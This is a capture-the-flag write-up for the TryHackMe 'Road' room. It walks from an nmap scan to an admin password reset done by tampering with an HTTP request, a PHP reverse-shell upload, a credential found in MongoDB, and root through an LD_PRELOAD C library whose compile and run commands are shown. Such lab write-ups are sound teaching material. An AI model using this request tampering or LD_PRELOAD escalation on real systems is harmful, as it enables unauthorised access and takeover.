
[TryHackMe Link](https://tryhackme.com/room/road){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 11"
    # Nmap 7.93 scan initiated Sun Jul  9 10:54:22 2023 as: nmap -sC -sV -O -oN nmap.sh 10.10.54.178
    Nmap scan report for 10.10.54.178
    Host is up (0.21s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e6dc8869dea1738e845ba13e279f0724 (RSA)
    |   256 6bea185d8dc79e9a012cdd50c5f8c805 (ECDSA)
    |_  256 ef06d7e4b165156e9462ccddf08a1a24 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Sky Couriers
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=7/9%OT=22%CT=1%CU=30556%PV=Y%DS=5%DC=I%G=Y%TM=64AA44B3
    OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=
    OS:A)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11
    OS:NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B
    OS:3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M50
    OS:8NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
    OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
    OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
    OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
    OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Sun Jul  9 10:55:07 2023 -- 1 IP address (1 host up) scanned in 45.27 seconds

  ```

## <b>Enumeration</b>

Initially when I explored Port 80, I came across this websitethat featured a Dashboard panel offering both registration and login options. 

<img id="image1" />

I decided to create a new account and logged in as a new user. However, I didn't find anything particularly interesting.

<img id="image2" />

While exploring the profile settings, I noticed an upload feature but unfortunately, it was restricted to the `Admin` user **(admin@sky.thm)**. so, I found an opportunity to reset the password for the current user, which seemed like a potential path to gain initial access. 

<img id="image3" />

## <b>Initial Access</b>

Using Burp Suite, I intercepted the request and successfully reset the password for the Admin user.

<img id="image4" />

```http linenums="1" hl_lines="18"
POST /v2/lostpassword.php HTTP/1.1
Host: 10.10.54.178
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17515829183654701604862655514
Content-Length: 649
Origin: http://10.10.54.178
Connection: close
Referer: http://10.10.54.178/v2/ResetUser.php
Cookie: PHPSESSID=rvkqhtj1t07f5fuvs3pkd1t1c3; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Upgrade-Insecure-Requests: 1

-----------------------------17515829183654701604862655514
Content-Disposition: form-data; name="uname"

skyacc@sky.cloud (I changed this to admin@sky.thm)
-----------------------------17515829183654701604862655514
Content-Disposition: form-data; name="npass"

1234
-----------------------------17515829183654701604862655514
Content-Disposition: form-data; name="cpass"

1234
-----------------------------17515829183654701604862655514
Content-Disposition: form-data; name="ci_csrf_token"


-----------------------------17515829183654701604862655514
Content-Disposition: form-data; name="send"

Submit
-----------------------------17515829183654701604862655514--
```

With access as Admin, I now had the ability to upload a profile image. 

<img id="image5" />

I uploaded porfile image several times, but I found it confusing that I didn't receive any explicit confirmation from UI. Also, I was not sure about the location of the uploaded files. I intercepted the request once again and observed that the file path was: `/v2/profileimages/`.

To gain an initial shell access, I used the popular **reverse shell for PHP** developed by `Pentest-Monkey`. This granted me a shell with the current user, www-data. 

<img id="image6" />

The permissions on the `user.txt` file were set as: 

```bash
-rw-r--r-- webdeveloper webdeveloper user.txt
```
Since I can open, I successfully read the `user.txt` file.

## <b>Privilege Escalation</b>

To elevate my privileges, I used **LinPeas** privilege escalation tool to gather information about the system. The scan revealed that few well-known ports were used locally -- `3306` (MySQL) and `27017` (Mongo). 

<img id="image7" />

Although I couldn't access MySQL, I had good luck with MongoDB. In one of the tables, I discovered the password for the webdeveloper account. 

```sql linenums="1" hl_lines="21"
> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB

> use backup
switched to db backup

> show tables
collection
user

> select * from user
uncaught exception: SyntaxError: unexpected token: identifier :
@(shell):1:14

> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "REDACTED" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

Utilising this password, I established an SSH connection as the `webdeveloper` user, which allowed me to penetrate further into the system. I explored different commands that can be run through this user. To my surprise, it had 

```bash
NOPASSWD: /usr/bin/sky_backup_utility
```

<img id="image8" />

This command could be executed with the help of `LD_PRELOAD`. 

!!! info "LD_PRELOAD"
    LD_PRELOAD preloads a shared library into a program's memory space before it starts executing. you can replace or extend the functionality of standard libraries or to override certain library calls with custom implementations.


Utilising the capabilities of LD_PRELOAD, I executed this C code snippet:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

// Step 1: Compile the code and generate its object code.
// gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles 

// Step 2: Using LD_PRELOAD, preload this shared object before sky_backup_utility runs
// LD_PRELOAD=/tmp/x.so /usr/bin/sky_backup_utility
```

By compiling and executing the code above, I successfully obtained root access, where I found the root flag.

<img id="image9" />

<script>

// JSON object
const data = {
    "desc": "Inspired by a real-world pentesting engagement",
    "ip":  "10.10.54.178",
    "ports": "22/tcp,ssh,OpenSSH 8.2p1;80/tcp,http,Apache httpd 2.4.41",
    "difficulty":"medium",
    "id": "1"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>